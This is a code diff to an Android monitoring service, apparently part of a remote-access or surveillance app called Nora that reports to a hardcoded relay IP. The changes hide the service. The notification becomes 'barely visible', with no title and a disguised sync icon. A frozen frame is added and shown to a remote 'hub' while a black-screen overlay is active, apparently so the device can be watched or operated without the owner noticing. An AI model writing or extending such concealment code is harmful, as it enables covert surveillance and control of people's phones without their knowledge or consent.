@@ -20,7 +20,7 @@ import org.json.JSONObject;
 public class MonitorService extends Service {
 
     private static final String TAG     = "MonitorService";
-    private static final String CHANNEL = "nora_monitor";
+    static final String CHANNEL = "nora_monitor";
     private static final int    NOTIF_ID = 1;
 
     public static final String DEFAULT_RELAY = "http://162.35.37.67:5000";
@@ -34,24 +34,31 @@ public class MonitorService extends Service {
     private static MonitorService instance;
     public static MonitorService getInstance() { return instance; }
 
+    // Frozen frame shown to hub while black screen overlay is active
+    private volatile byte[] frozenFrame = null;
+    public void  setFrozenFrame(byte[] jpeg) { frozenFrame = jpeg; }
+    public byte[] getFrozenFrame()           { return frozenFrame; }
+
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // IMPORTANCE_MIN = no status-bar icon, no sound, barely visible
             NotificationChannel ch = new NotificationChannel(
-                CHANNEL, "Nora Monitor", NotificationManager.IMPORTANCE_LOW);
+                CHANNEL, "Nora", NotificationManager.IMPORTANCE_MIN);
+            ch.setShowBadge(false);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
         }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Basic foreground service — no service type, no permissions required
         Notification notif = new NotificationCompat.Builder(this, CHANNEL)
-            .setContentTitle("Nora Monitor")
-            .setContentText("Active")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setShowWhen(false)
+            .setSilent(true)
             .build();
         startForeground(NOTIF_ID, notif);
 
